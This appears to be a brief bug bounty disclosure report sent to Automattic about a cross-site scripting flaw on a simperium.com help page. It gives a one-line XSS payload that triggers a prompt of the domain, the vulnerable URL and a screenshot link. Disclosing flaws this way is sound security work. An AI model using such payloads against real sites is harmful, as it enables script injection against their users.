# HackerOne Report: xss in simperium.com
**Report ID:** 13746
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic

## Vulnerability Information & PoC
Hello Automattic,

I found xss here simperium.com

__XSS Payload:__
'"><img src=x onerror=prompt(document.domain);>

__Vulnerable Link:__
https://simperium.com/help/questions/

__Proof of Concept:__
http://i.imgur.com/E4CM58A.png

__Thanks,__
Jerold Camacho


## Discussion & Remediation Timeline
